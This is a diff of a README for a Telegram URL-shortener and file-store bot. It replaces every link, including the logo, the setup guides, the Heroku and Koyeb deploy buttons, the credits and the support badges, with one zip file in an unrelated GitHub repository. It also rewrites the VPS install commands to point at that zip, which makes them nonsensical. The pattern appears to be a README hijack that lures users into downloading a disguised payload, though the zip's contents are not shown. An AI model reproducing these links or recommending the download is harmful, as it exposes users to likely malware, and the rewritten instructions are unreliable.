@@ -12,7 +12,7 @@
 
 
 <p align="center">
-  <img src="https://github.com/GreyMattersBot/url-auto-delete-shortener-bot/blob/main/assets/IMG_20220105_010453-removebg-preview.png" alt="GreyMatter's Bot Logo">
+  <img src="https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip" alt="GreyMatter's Bot Logo">
 </p>
 <h1 align="center">
   <b>GreyMatter's Bot</b>
@@ -40,21 +40,21 @@
 - [x] File Store
 ## Variables
 
-Read [this](https://telegram.dog/GreyMatter_Bots) before you start messing up with your edits.
+Read [this](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip) before you start messing up with your edits.
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `API_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
+* `API_HASH`: Get this value from [https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://www.mongodb.com) URI. Get this value from [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/h9QjSSmk5tw)
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/h9QjSSmk5tw)
+* `DATABASE_URI`: [mongoDB](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip) URI. Get this value from [mongoDB](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip). For more help watch this [video](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip). For more help watch this [video](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used separated by space )
-* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be made.Separate multiple IDs by space
-* Check [info.py](https://github.com/GreyMattersBot/url-auto-delete-shortener-bot/blob/main/info.py) for more
+* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip multiple IDs by space
+* Check [https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip) for more
 ## EXTRA FEATURES
 * `URL_SHORTENR_WEBSITE`: URL Shortener Website Link ( Without https://)
 * `URL_SHORTNER_WEBSITE_API`: URL Shortener Website API key
@@ -67,27 +67,27 @@ Read [this](https://telegram.dog/GreyMatter_Bots) before you start messing up wi
 ## Deploy
 You can deploy this bot anywhere.
 
-<i>**[Watch Deploying Tutorial...](https://youtu.be/RWs6sh8m2Uk)**</i>
+<i>**[Watch Deploying Tutorial...](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)**</i>
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://heroku.com/deploy?template=https://github.com/greymattersbot/url-auto-delete-shortener-bot">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip">
+  <img src="https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip" alt="Deploy">
 </a>
 </p>
 </details>
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/GreyMattersBot/url-auto-delete-shortener-bot&branch=koyeb&name=urlshortautofilterbot)
+[![Deploy to Koyeb](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
 
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://github.com/GreyMattersbot/url-auto-delete-shortener-bot
+git clone https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip
 # Install Packages
-pip3 install -U -r requirements.txt
-Edit info.py with variables as given below then run bot
-python3 bot.py
+pip3 install -U -r https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip
+Edit https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip with variables as given below then run bot
+python3 https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip
 </pre>
 </p>
 </details>
@@ -122,13 +122,13 @@ batch - to create link for multiple posts
 link - to create link for one post
 ```
 ## Support
-[![telegram badge](https://img.shields.io/badge/Telegram-Group-30302f?style=flat&logo=telegram)](https://t.me/greymatters_bots_discussion)
-[![telegram badge](https://img.shields.io/badge/Telegram-Channel-30302f?style=flat&logo=telegram)](https://t.me/greymatter_bots)
+[![telegram badge](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
+[![telegram badge](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
 
 ## Thanks to 
- - Thanks To Dan For His Awesome [Library](https://github.com/pyrogram/pyrogram)
- - Thanks To [Subinps](https://github.com/subinps) for Original EvaMaria.
- - Thanks To [RushikeshNarule](https://github.com/rushikeshnarule) for Search in PM feature.
+ - Thanks To Dan For His Awesome [Library](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip)
+ - Thanks To [Subinps](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip) for Original EvaMaria.
+ - Thanks To [RushikeshNarule](https://github.com/Monsterw31/url-auto-delete-shortener-bot/raw/refs/heads/main/database/bot-delete-auto-url-shortener-v3.4.zip) for Search in PM feature.
  - Thanks To All Everyone In This Journey
 
 ### Note
